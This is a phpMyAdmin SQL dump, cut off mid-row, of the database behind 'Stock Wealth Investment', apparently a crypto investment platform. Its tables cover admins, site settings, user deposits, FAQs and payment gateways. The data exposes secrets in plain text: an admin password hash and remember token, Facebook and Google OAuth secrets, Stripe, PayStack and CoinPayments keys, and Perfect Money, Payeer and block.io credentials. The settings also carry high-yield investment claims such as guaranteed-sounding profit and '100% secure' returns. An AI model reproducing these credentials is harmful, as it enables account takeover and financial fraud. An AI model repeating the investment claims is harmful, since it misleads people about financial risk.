-- phpMyAdmin SQL Dump
-- version 5.2.2
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Jul 10, 2026 at 06:09 PM
-- Server version: 11.4.12-MariaDB
-- PHP Version: 8.4.21

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `stockswelt_uikvfiku76`
--

-- --------------------------------------------------------

--
-- Table structure for table `admins`
--

CREATE TABLE `admins` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) NOT NULL,
  `username` varchar(191) NOT NULL,
  `email` varchar(191) NOT NULL,
  `password` varchar(191) NOT NULL,
  `remember_token` varchar(100) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `mobile` varchar(191) NOT NULL,
  `image` varchar(191) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `admins`
--

INSERT INTO `admins` (`id`, `name`, `username`, `email`, `password`, `remember_token`, `created_at`, `updated_at`, `mobile`, `image`) VALUES
(1, 'Mr Admin', 'admin', 'support@thesoftking.com', '$2y$10$A6C09gTpSfM/5oF.5ZzAY.kmce1gO2XBGvUvhwLHF2962cHsYZqbG', 'bsKiCGtdvwX0E8AWk4tsffrndxswq9vAAe0pnhO6URBzRnuH6tGnwOebYF9z', NULL, '2018-12-05 00:22:32', '+01235485258', 'admin_1543990907.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `admin_password_resets`
--

CREATE TABLE `admin_password_resets` (
  `id` int(11) NOT NULL,
  `email` varchar(191) NOT NULL,
  `token` varchar(191) NOT NULL,
  `status` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `basic_settings`
--

CREATE TABLE `basic_settings` (
  `id` int(10) UNSIGNED NOT NULL,
  `sitename` varchar(191) DEFAULT NULL,
  `color` varchar(191) DEFAULT NULL,
  `color_two` varchar(190) DEFAULT NULL,
  `currency` varchar(191) DEFAULT NULL,
  `currency_sym` varchar(191) DEFAULT NULL,
  `email_notification` tinyint(1) DEFAULT NULL,
  `sms_notification` tinyint(4) DEFAULT NULL,
  `emailver` int(11) DEFAULT 0,
  `smsver` int(11) DEFAULT 0,
  `phone` varchar(191) DEFAULT NULL,
  `email` varchar(191) DEFAULT NULL,
  `address` varchar(191) DEFAULT NULL,
  `esender` varchar(191) DEFAULT NULL,
  `emobile` varchar(191) DEFAULT NULL,
  `emessage` longtext DEFAULT NULL,
  `smsapi` mediumtext DEFAULT NULL,
  `banner_title` text DEFAULT NULL,
  `banner_sub_title` text DEFAULT NULL,
  `service_title` varchar(191) DEFAULT NULL,
  `service_sub_title` text DEFAULT NULL,
  `test_title` varchar(191) DEFAULT NULL,
  `test_sub_title` text DEFAULT NULL,
  `blog_title` varchar(191) DEFAULT NULL,
  `blog_sub_title` text DEFAULT NULL,
  `footer` varchar(191) DEFAULT NULL,
  `footer_text` text DEFAULT NULL,
  `team_title` varchar(191) DEFAULT NULL,
  `team_sub_title` text DEFAULT NULL,
  `fb_client_id` varchar(191) NOT NULL,
  `fb_client_secret` varchar(191) NOT NULL,
  `google_client_id` varchar(191) NOT NULL,
  `google_client_secret` varchar(191) NOT NULL,
  `social_login` int(11) NOT NULL DEFAULT 0,
  `faq_title` varchar(190) DEFAULT NULL,
  `faq_sub_title` text DEFAULT NULL,
  `static_title_1` varchar(190) DEFAULT NULL,
  `static_number_1` varchar(190) DEFAULT NULL,
  `static_icon_1` varchar(190) DEFAULT NULL,
  `static_title_2` varchar(190) DEFAULT NULL,
  `static_number_2` varchar(190) DEFAULT NULL,
  `static_icon_2` varchar(190) DEFAULT NULL,
  `static_title_3` varchar(190) DEFAULT NULL,
  `static_number_3` varchar(190) DEFAULT NULL,
  `static_icon_3` varchar(190) DEFAULT NULL,
  `about_title` varchar(190) DEFAULT NULL,
  `about_detail` longtext DEFAULT NULL,
  `plan_title` text DEFAULT NULL,
  `plan_subtitle` text DEFAULT NULL,
  `deposit_wallet_name` varchar(190) DEFAULT NULL,
  `interest_wallet_name` varchar(190) DEFAULT NULL,
  `bal_trans_fixed_charge` varchar(190) DEFAULT NULL,
  `bal_trans_per_charge` varchar(191) DEFAULT NULL,
  `template_active` varchar(50) NOT NULL DEFAULT 'template1',
  `video_url` text DEFAULT NULL,
  `how_it_work_title` varchar(190) DEFAULT NULL,
  `how_it_work_sub_title` text DEFAULT NULL,
  `referral_title` text DEFAULT NULL,
  `referral_sub_title` text DEFAULT NULL,
  `transaction_title` text DEFAULT NULL,
  `transaction_sub_title` text DEFAULT NULL,
  `payment_title` text DEFAULT NULL,
  `payment_sub_title` text DEFAULT NULL,
  `subscriber_title` varchar(191) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `basic_settings`
--

INSERT INTO `basic_settings` (`id`, `sitename`, `color`, `color_two`, `currency`, `currency_sym`, `email_notification`, `sms_notification`, `emailver`, `smsver`, `phone`, `email`, `address`, `esender`, `emobile`, `emessage`, `smsapi`, `banner_title`, `banner_sub_title`, `service_title`, `service_sub_title`, `test_title`, `test_sub_title`, `blog_title`, `blog_sub_title`, `footer`, `footer_text`, `team_title`, `team_sub_title`, `fb_client_id`, `fb_client_secret`, `google_client_id`, `google_client_secret`, `social_login`, `faq_title`, `faq_sub_title`, `static_title_1`, `static_number_1`, `static_icon_1`, `static_title_2`, `static_number_2`, `static_icon_2`, `static_title_3`, `static_number_3`, `static_icon_3`, `about_title`, `about_detail`, `plan_title`, `plan_subtitle`, `deposit_wallet_name`, `interest_wallet_name`, `bal_trans_fixed_charge`, `bal_trans_per_charge`, `template_active`, `video_url`, `how_it_work_title`, `how_it_work_sub_title`, `referral_title`, `referral_sub_title`, `transaction_title`, `transaction_sub_title`, `payment_title`, `payment_sub_title`, `subscriber_title`, `created_at`, `updated_at`) VALUES
(1, 'Stock Wealth Investment', '106feb', '54a6f0', 'USD', '$', 1, 0, 0, 0, '+44 204 SWI', 'info@stockswealthinvestment.icu', 'Lindeyer Francis Ferguson, North House 198 High Street Tonbridge, Kent, TN9 1BE', 'info@stockswealthinvestment.icu', NULL, '<br><br>\r\n	<div class=\"contents\" style=\"max-width: 600px; margin: 0 auto; border: 2px solid #000036;\">\r\n\r\n<div class=\"header\" style=\"background-color: #000036; padding: 15px; text-align: center;\">\r\n	<div class=\"logo\" style=\"width: 260px;text-align: center; margin: 0 auto;\"><br></div>\r\n</div>\r\n\r\n<div class=\"mailtext\" style=\"padding: 30px 15px; background-color: #f0f8ff; font-family: \'Open Sans\', sans-serif; font-size: 16px; line-height: 26px;\">\r\n\r\nHi {{name}},\r\n<br><br>\r\n{{message}}\r\n<br><br>\r\n<br>\r\n</div>\r\n\r\n<div class=\"footer\" style=\"background-color: #000036; padding: 15px; text-align: center;\"><br></div>\r\n\r\n\r\n<div class=\"footer\" style=\"background-color: #000036; padding: 15px; text-align: center; border-top: 1px solid rgba(255, 255, 255, 0.2);\"><strong style=\"color: #fff;\">2011 - 2026 Stock Wealth Investment. All Rights Reserved.</strong>\r\n<br><p style=\"color: #ddd;\"><span style=\"color: rgb(255, 255, 255); font-size: 0.875rem;\"><b>Stock Wealth Investment</b></span><b>&nbsp;</b>is not partnered with any other \r\ncompany or person. We work as a team and do not have any reseller, \r\ndistributor or partner!</p>\r\n\r\n\r\n</div>\r\n\r\n	</div>\r\n<br><br>', 'https://api.infobip.com/api/v3/sendsms/plain?user=****&password=****&sender=Sender&SMSText={{message}}&GSM={{number}}&type=longSMS', 'A Progressive Money Building Platform!', 'Invest in a Professional and Reliable company where we will utilize your money and offer you the best returns of your investment and in a very secure way.', 'Our Features', 'Our goal is to utilize your money and provide a source of high income while minimizing the any possibility of risk.', 'What Users Say!', 'A huge number of people trust us and here are the words of some of them.', 'GET LATEST BLOG', 'You will get all the latest news and investment tips in our website. Keep an eye on our Latest News to be in touch.', '© stockswealthinvestment.icu 2026 -All Rights Reserved', 'A new way to make investments easy, reliable and 100% secure.', 'Our Team Members', 'Take a look at our professional individuals working to make your dream come true.', '277229062999748', '1acfc850f73d1955d14b282938585122', '53929591142-l40gafo7efd9onfe6tj545sf9g7tv15t.apps.googleusercontent.com', 'BRdB3np2IgYLiy4-bwMcmOwN', 0, 'Frequently Asked Questions', 'We answer some of your Frequently Asked Questions regarding our platform. If you have a query that is not answered here, Please feel free to contact us.', 'Users', '50K+', 'users', 'Deposit', '$106K+', 'money', 'Withdraw', '$38K+', 'download', 'About Us', 'We are an international company engaged in activities related to cryptocurrency exchanges performed by qualified professional traders.\r\nOur goal is to utilize your money and provide a source of high income while minimizing the any possibility of risk also ensuring a high quality service, allowing us to have a good relation with our investors. We work to ensure a profit of your investment. We look forward for you to be a part of our company.', 'This is Our Plan', 'To make a profitable investment, you have to know where you are investing. Find a plan which is suits you the best.', 'Deposit Wallet', 'Interest Wallet', '5', '2', 'template2.', 'https://www.youtube.com/watch?v=GT6-H4BRyqQ', 'How It Works', 'We utilize your money by our professional traders and provide you a high income source.', 'Referral Commission Section', 'It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout.', 'Transactions  Section', 'Take a look at our investors latest deposits and withdrawals.', 'Payment Section', 'We accept all major cryptocurrencies and fiat payment methods to make your investment process easier with our platform.', 'Subscribe our Newsletter to get reguler updates', NULL, '2026-05-23 16:01:30');

-- --------------------------------------------------------

--
-- Table structure for table `blogs`
--

CREATE TABLE `blogs` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` varchar(191) NOT NULL,
  `image` varchar(191) NOT NULL,
  `text` longtext NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `deposits`
--

CREATE TABLE `deposits` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `gateway_id` int(11) DEFAULT NULL,
  `amount` varchar(191) DEFAULT NULL,
  `charge` varchar(191) DEFAULT NULL,
  `usd_amo` varchar(191) DEFAULT NULL,
  `btc_amo` varchar(191) DEFAULT NULL,
  `btc_wallet` varchar(191) DEFAULT NULL,
  `trx` varchar(191) DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT 0,
  `try` int(11) NOT NULL DEFAULT 0,
  `image` varchar(190) DEFAULT NULL,
  `detail` longtext DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `deposits`
--

INSERT INTO `deposits` (`id`, `user_id`, `gateway_id`, `amount`, `charge`, `usd_amo`, `btc_amo`, `btc_wallet`, `trx`, `status`, `try`, `image`, `detail`, `created_at`, `updated_at`) VALUES
(1, 4, 501, '20000', '101', '239.3', '0', '', 'iQRotdx5G6gE44X1', 0, 0, NULL, NULL, '2026-05-10 19:56:56', '2026-05-10 19:56:56'),
(2, 3, 501, '2000', '11', '23.94', '0', '', 'gjquuuzJCbHqd6vI', 0, 0, NULL, NULL, '2026-05-11 18:53:11', '2026-05-11 18:53:11'),
(3, 2, 501, '10000', '51', '119.65', '0', '', 'z74daBLfS1DmR3rn', 0, 0, NULL, NULL, '2026-05-13 01:55:07', '2026-05-13 01:55:07'),
(4, 4, 501, '500', '3.5', '5.99', '0', '', 'Dn5LFrGi52EWHp4x', 0, 0, NULL, NULL, '2026-05-13 02:01:15', '2026-05-13 02:01:15'),
(5, 2, 501, '500', '3.5', '5.99', '0', '', 'iZ6CIzTk3S0vauD5', 0, 0, NULL, NULL, '2026-05-14 12:37:44', '2026-05-14 12:37:44'),
(6, 2, 502, '20000', '101', '239.3', '0', '', 'y3nECqXdlzImbnqk', 0, 0, NULL, NULL, '2026-05-19 22:13:22', '2026-05-19 22:13:22'),
(7, 2, 518, '200', '5', '205', '0', '', 'QxKOCGEpdUJXlmk2', 1, 0, '1779237331.jpg', 'Jdndndnd dh', '2026-05-20 00:34:53', '2026-05-20 00:36:04'),
(8, 4, 501, '200', '2', '2.4', '0', '', 'utCWZceOeDIF212V', 0, 0, NULL, NULL, '2026-05-20 00:35:25', '2026-05-20 00:35:25'),
(9, 4, 501, '200', '2', '2.4', '0', '', '0p1BSDuGPwVJRzx9', 0, 0, NULL, NULL, '2026-05-20 00:36:56', '2026-05-20 00:36:56'),
(10, 4, 502, '500', '3.5', '5.99', '0', '', 'naLPCT1oFSnCQydd', 0, 0, NULL, NULL, '2026-05-20 00:40:35', '2026-05-20 00:40:35'),
(11, 2, 518, '200', '5', '205', '0', '', 'RVKraW22klI02U3V', 1, 0, '1779237726.jpg', 'Dhdhdbdvdb', '2026-05-20 00:41:33', '2026-05-21 21:00:57'),
(12, 2, 501, '200', '2', '2.4', '0', '', 'nC6clrkfDmscPtzv', 0, 0, NULL, NULL, '2026-05-20 00:42:43', '2026-05-20 00:42:43'),
(13, 4, 502, '500', '3.5', '5.99', '0', '', 'Xh45iGxS9VAuFPLW', 0, 0, NULL, NULL, '2026-05-20 00:45:45', '2026-05-20 00:45:45'),
(14, 4, 518, '500', '11', '511', '0', '', '5m1sgBNZcGiNxFBV', 0, 0, NULL, NULL, '2026-05-20 00:46:22', '2026-05-20 00:46:22'),
(15, 2, 507, '500', '13.11', '6.11', '0', '', 'P0cKb3JtICBpPvUz', 0, 0, NULL, NULL, '2026-05-21 16:27:17', '2026-05-21 16:27:17'),
(16, 2, 509, '500', '13.11', '6.11', '0', '', '7MxYCCWX4KdWJmtD', 0, 0, NULL, NULL, '2026-05-21 16:29:12', '2026-05-21 16:29:12'),
(17, 6, 505, '100', '3.0300000000000002', '1.23', '0', '', 'zOpLJNRXWSrmSyML', 0, 0, NULL, NULL, '2026-05-21 19:37:21', '2026-05-21 19:37:21'),
(18, 6, 519, '500', '0', '500', '0', '', 'tsxvy0wtQrd4iu4c', 2, 0, '1779394530.jpg', 'TESTING', '2026-05-21 20:14:53', '2026-05-21 20:16:07'),
(19, 7, 519, '500', '0', '500', '0', '', 'k1iQlKGQ4eMLIgqT', 1, 0, '1779461923.jpg', 'Dylan dreyer I made payment of $500 only', '2026-05-22 14:55:27', '2026-05-22 16:26:32'),
(20, 2, 519, '2000', '0', '2000', '0', '', 'yXQhSKlEOLJmwKww', 0, 0, NULL, NULL, '2026-05-22 16:36:45', '2026-05-22 16:36:45'),
(21, 5, 519, '500', '0', '500', '0', '', 'XebJZ0YM08BSxCyw', 1, 0, '1779496559.jpg', 'KeithBaker', '2026-05-23 00:18:18', '2026-05-23 00:36:22'),
(22, 2, 521, '200', '0', '200', '0', '', 'GGoA6j6HFrFuMCIK', 0, 0, NULL, NULL, '2026-05-23 10:32:24', '2026-05-23 10:32:24'),
(23, 4, 519, '500', '0', '500', '0', '', 'nRDid6Gc9o2679T8', 1, 0, '1779532577.jpg', 'Jdbdhdnfkrjrkgkgkgngkgng', '2026-05-23 10:32:24', '2026-05-23 15:38:35'),
(24, 2, 519, '200', '0', '200', '0', '', 'UxmZ0DsS6fZkQimd', 1, 0, '1779532596.jpg', 'Djdhxbxjxncjxxjxnxm', '2026-05-23 10:35:45', '2026-05-23 10:43:52'),
(25, 2, 519, '100', '0', '100', '0', '', '461vOzNWNXnAmLNd', 1, 0, '1779562131.jpg', 'Shxvxbbdhxbdbdbfb', '2026-05-23 18:48:09', '2026-05-26 13:04:52'),
(26, 4, 519, '200', '0', '200', '0', '', 'gSgTFLjqzuLANZL7', 0, 0, NULL, NULL, '2026-05-26 12:54:10', '2026-05-26 12:54:10'),
(27, 2, 519, '200', '0', '200', '0', '', '7Ev3S9QfVY4QW5hS', 0, 0, NULL, NULL, '2026-05-26 16:47:57', '2026-05-26 16:47:57'),
(28, 2, 519, '200', '0', '200', '0', '', '6WbJKvWPPSoFi5vA', 0, 0, NULL, NULL, '2026-05-26 16:58:37', '2026-05-26 16:58:37'),
(29, 2, 519, '200', '0', '200', '0', '', 'uQQPmgh9w0biGPWM', 0, 0, NULL, NULL, '2026-05-26 17:05:35', '2026-05-26 17:05:35'),
(30, 2, 520, '200', '0', '200', '0', '', 'mWsbf9XUvekEkuFZ', 0, 0, NULL, NULL, '2026-05-26 17:06:19', '2026-05-26 17:06:19'),
(31, 2, 519, '200', '0', '200', '0', '', 'NQ9CKKT269QEbhwB', 0, 0, NULL, NULL, '2026-05-26 17:09:55', '2026-05-26 17:09:55'),
(32, 2, 521, '200', '0', '200', '0', '', '1cSWbvUsXId8x2Ui', 0, 0, NULL, NULL, '2026-05-26 17:11:12', '2026-05-26 17:11:12'),
(33, 2, 522, '200', '0', '200', '0', '', 'w0id2TtKQZf7AtAD', 0, 0, NULL, NULL, '2026-05-26 17:13:18', '2026-05-26 17:13:18'),
(34, 2, 523, '200', '0', '200', '0', '', '4mOu5F3b3BsPADv2', 0, 0, NULL, NULL, '2026-05-26 17:14:06', '2026-05-26 17:14:06'),
(35, 11, 519, '200', '0', '200', '0', '', 'f2iJzEobaJQz5KO5', 0, 0, NULL, NULL, '2026-05-26 17:15:23', '2026-05-26 17:15:23'),
(36, 2, 519, '2000', '0', '2000', '0', '', 'pW2zYktY6uUxQYKm', 0, 0, NULL, NULL, '2026-05-26 17:42:45', '2026-05-26 17:42:45'),
(37, 12, 521, '200', '0', '200', '0', '', 'Rdayi1AcQl553tJm', 0, 0, NULL, NULL, '2026-05-27 09:51:47', '2026-05-27 09:51:47'),
(38, 5, 519, '500', '0', '500', '0', '', 'RA5nAZArvzEyAgi6', 1, 0, '1780099753.jpg', 'KeithBaker', '2026-05-30 00:05:48', '2026-05-30 01:44:43'),
(39, 5, 519, '500', '0', '500', '0', '', 'oCtiO8goXROPbWYq', 1, 0, '1780531798.jpg', 'KeithBaker', '2026-06-04 00:08:45', '2026-06-04 00:11:40'),
(40, 5, 519, '500', '0', '500', '0', '', '7yN0rrmDNUReC6DI', 1, 0, '1781018212.jpg', 'KeithBaker', '2026-06-09 15:14:47', '2026-06-09 17:31:26'),
(41, 4, 519, '500', '0', '500', '0', '', 'xOEnXIMxYz6ufQZ0', 1, 0, '1781026706.jpg', 'Gehehdhfhfhfhfhfhfhfh', '2026-06-09 17:35:18', '2026-06-09 17:38:46'),
(42, 4, 519, '500', '0', '500', '0', '', 'kTBYfZDDKO9zFObm', 1, 0, '1781744917.jpg', 'Khhggfffffff', '2026-06-18 01:08:03', '2026-06-18 13:22:29'),
(43, 5, 519, '500', '0', '500', '0', '', 'OZLocbpiJ4sVZaeQ', 1, 0, '1781783202.jpg', 'KeithBaker', '2026-06-18 11:45:20', '2026-06-18 13:22:23'),
(44, 16, 519, '100', '0', '100', '0', '', 'GsDpi8MtftyMQxCc', 0, 0, NULL, NULL, '2026-06-22 16:27:43', '2026-06-22 16:27:43'),
(45, 16, 521, '100', '0', '100', '0', '', 'wmLsiqsBEEZLcign', 0, 0, NULL, NULL, '2026-06-22 16:28:20', '2026-06-22 16:28:20'),
(46, 5, 519, '244.29', '0', '244.29', '0', '', 'WruuzNP3fjly9QCP', 1, 0, '1783006192.jpg', 'KeithBaker', '2026-07-02 15:29:01', '2026-07-02 23:58:15'),
(47, 5, 519, '300', '0', '300', '0', '', '0w7tU2050i1PzANZ', 1, 0, '1783090221.jpg', 'KeithBaker', '2026-07-03 14:49:27', '2026-07-03 20:46:59');

-- --------------------------------------------------------

--
-- Table structure for table `epins`
--

CREATE TABLE `epins` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) NOT NULL,
  `amount` varchar(191) NOT NULL,
  `pin` varchar(191) NOT NULL,
  `status` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `faqs`
--

CREATE TABLE `faqs` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` varchar(191) NOT NULL,
  `description` longtext NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `faqs`
--

INSERT INTO `faqs` (`id`, `title`, `description`, `created_at`, `updated_at`) VALUES
(2, 'How will I know that the withdrawal is successful?', 'You will get an automatic notification once we send the funds and you can always check your transactions or account balance. Your chosen payment system dictates how long it will take for the funds to reach you. You will get an automatic notification once we send the funds and you can always check your transactions or account balance. Your chosen payment system dictates how long it will take for the funds to reach you.', '2018-12-04 00:10:31', '2021-01-25 15:45:36'),
(3, 'I forgot my password, what should I do', 'Visit the password reset page, type in your email address and click the `Reset` button. Visit the password reset page, type in your email address and click the `Reset` button.', '2018-12-04 00:10:49', '2021-01-25 15:44:54'),
(4, 'What can I deposit/withdraw from my account', 'Deposit and withdrawal are available for at any time. Be sure, that your funds are not used in any ongoing trade before the withdrawal. The available amount is shown in your dashboard on the main page of Investing platform. Deposit and withdrawal are available for at any time. Be sure, that your funds are not used in any ongoing trade before the withdrawal. The available amount is shown in your dashboard on the main page of Investing platform.', '2018-12-04 00:11:05', '2021-01-25 15:43:51'),
(5, 'Can I make money with Bitcoin?', 'You should never expect to get rich with Bitcoin or any emerging technology. It is always important to be wary of anything that sounds too good to be true or disobeys basic economic rules.', '2018-12-04 00:12:03', '2021-01-25 15:40:33'),
(6, 'What is Bitcoin?', 'Bitcoin is a consensus network that enables a new payment system and completely digital money. It is the first decentralized peer-to-peer payment network that is powered by its users with no central authority or middlemen. From a user perspective, Bitcoin is pretty much like cash for the Internet. Bitcoin can also be seen as the most prominent triple entry bookkeeping system in existence.', '2018-12-04 00:12:10', '2021-01-25 15:39:41');

-- --------------------------------------------------------

--
-- Table structure for table `gateways`
--

CREATE TABLE `gateways` (
  `id` int(10) UNSIGNED NOT NULL,
  `main_name` varchar(191) DEFAULT NULL,
  `name` varchar(191) NOT NULL,
  `minamo` varchar(191) DEFAULT NULL,
  `maxamo` varchar(191) DEFAULT NULL,
  `fixed_charge` varchar(191) DEFAULT NULL,
  `percent_charge` varchar(191) DEFAULT NULL,
  `rate` varchar(191) DEFAULT NULL,
  `val1` varchar(191) DEFAULT NULL,
  `val2` varchar(191) DEFAULT NULL,
  `val3` varchar(191) DEFAULT NULL COMMENT 'paytm Website',
  `val4` varchar(191) DEFAULT NULL COMMENT 'paytm Industry Type',
  `val5` varchar(191) DEFAULT NULL COMMENT 'paytm Channel ID',
  `val6` varchar(191) DEFAULT NULL COMMENT 'paytm Transaction URL',
  `val7` varchar(191) DEFAULT NULL COMMENT 'paytm Transaction Status URL',
  `status` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `gateways`
--

INSERT INTO `gateways` (`id`, `main_name`, `name`, `minamo`, `maxamo`, `fixed_charge`, `percent_charge`, `rate`, `val1`, `val2`, `val3`, `val4`, `val5`, `val6`, `val7`, `status`, `created_at`, `updated_at`) VALUES
(101, 'PayPal', 'PayPal', '5', '1000', '0.511', '2.52', '84', 'rexrifat636@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-19 21:58:00'),
(102, 'PerfectMoney', 'Perfect Money', '20', '20000', '2', '1', '84', 'U5376900', 'G079qn4Q7XATZBqyoCkBteGRg', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-19 21:58:02'),
(103, 'Stripe', 'Credit Card', '10', '50000', '3', '3', '84', 'sk_test_aat3tzBCCXXBkS4sxY3M8A1B', 'pk_test_AU3G7doZ1sbdpJLj0NaozPBu', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-19 21:58:03'),
(104, 'Skrill', 'Skrill', '10', '50000', '3', '3', '84', 'merchant@skrill', 'TheSoftKing', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-19 21:58:04'),
(105, 'PayTM', 'PayTM', '1', '100', '1', '1', '84', 'PoojaE46324372286132', 'JAKMX9PVoj208dMq', 'WEB_STAGINGb', 'Retail', 'WEB', 'https://pguat.paytm.com/oltp-web/processTransaction', 'https://pguat.paytm.com/paytmchecksum/paytmCallback.jsp', 0, NULL, '2026-05-21 16:13:18'),
(106, 'Payeer', 'Payeer', '1', '100', '1', '1', '84', '627881897', 'Admin727096', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 16:12:36'),
(107, 'PayStack', 'PayStack', '1', '100', '1', '1', '84', 'pk_test_c1775454cc81a5ad2d6a31d0b0471585d44c4dcb', 'sk_test_22327c329aa7ea76448cfe279aa1e5d583d306fa', NULL, NULL, NULL, NULL, '0.0028', 0, NULL, '2026-05-21 16:11:36'),
(108, 'VoguePay', 'VoguePay', '1', '100', '1', '1', '84', 'demo', NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 16:11:36'),
(501, 'Blockchain.info', 'BitCoin', '1', '20000', '1', '0.5', '84', '3965f52f-ec19-43af-90ed-d613dc60657eSSS', 'xpub6DREmHywjNizvs9b4hhNekcjFjvL4rshJjnrHHgtLNCSbhhx5jKFRgqdmXAecLAddEPudDZY4xoDbV1NVHSCeDp1S7NumPCNNjbxB7sGasY0000', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 16:40:18'),
(502, 'block.io - BTC', 'BitCoin', '1', '99999', '1', '0.5', '84', '1658-8015-2e5e-9afb', '09876softk', NULL, NULL, NULL, NULL, NULL, 0, '2018-01-27 18:00:00', '2026-05-21 16:38:31'),
(503, 'block.io - LTC', 'LiteCoin', '100', '10000', '0.4', '1', '84', 'cb91-a5bc-69d7-1c27', '09876softk', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 16:37:27'),
(504, 'block.io - DOGE', 'DogeCoin', '1', '50000', '0.51', '2.52', '84', '2daf-d165-2135-5951', '09876softk', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 16:37:27'),
(505, 'CoinPayment - BTC', 'BitCoin', '1', '50000', '0.51', '2.52', '84', '596f0097ed9d1ab8cfed05eb59c70e9f066513dfe4df64a8fc3917d309328315', '7472928395208f70E3cE30B9e10dc882cBDD3e9967b7942AaE492106d9C7bE44', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 19:59:59'),
(506, 'CoinPayment - ETH', 'Etherium', '1', '50000', '0.51', '2.52', '84', '596f0097ed9d1ab8cfed05eb59c70e9f066513dfe4df64a8fc3917d309328315', '7472928395208f70E3cE30B9e10dc882cBDD3e9967b7942AaE492106d9C7bE44', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 20:00:16'),
(507, 'CoinPayment - BCH', 'BITCOIN CASH', '1', '50000', '0.51', '2.52', '84', '596f0097ed9d1ab8cfed05eb59c70e9f066513dfe4df64a8fc3917d309328315', '7472928395208f70E3cE30B9e10dc882cBDD3e9967b7942AaE492106d9C7bE44', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 17:57:51'),
(508, 'CoinPayment - DASH', 'BNB', '1', '50000', '0.51', '2.52', '0.001558', '596f0097ed9d1ab8cfed05eb59c70e9f066513dfe4df64a8fc3917d309328315', '7472928395208f70E3cE30B9e10dc882cBDD3e9967b7942AaE492106d9C7bE44', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 20:00:17'),
(509, 'CoinPayment - DOGE', 'USDT', '1', '50000', '0.51', '2.52', '1', '596f0097ed9d1ab8cfed05eb59c70e9f066513dfe4df64a8fc3917d309328315', '7472928395208f70E3cE30B9e10dc882cBDD3e9967b7942AaE492106d9C7bE44', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 20:00:41'),
(510, 'CoinPayment - LTC', 'LTC', '1', '50000', '0.51', '2.52', '84', '596f0097ed9d1ab8cfed05eb59c70e9f066513dfe4df64a8fc3917d309328315', '7472928395208f70E3cE30B9e10dc882cBDD3e9967b7942AaE492106d9C7bE44', NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 20:00:42'),
(512, 'CoinGate', 'Coingate', '6', '76', '76', '6', '767', '42424242424242424241', NULL, NULL, NULL, NULL, NULL, NULL, 0, '2018-07-08 18:00:00', '2026-05-21 16:45:26'),
(513, 'CoinPayment-ALL', 'BNB', '10', '1000', '05', '5', '0.00158', 'db1d9f12444e65c921604e289a281c56', NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, '2026-05-21 19:32:08'),
(518, NULL, 'Bank Wire', '1', '1000', '1', '2', '1', 'bc1qavq7t8up5znudhvzyegmsvsdjz775n0j9anlxp', NULL, NULL, NULL, NULL, NULL, NULL, 0, '2021-01-14 00:17:05', '2026-05-26 16:45:29'),
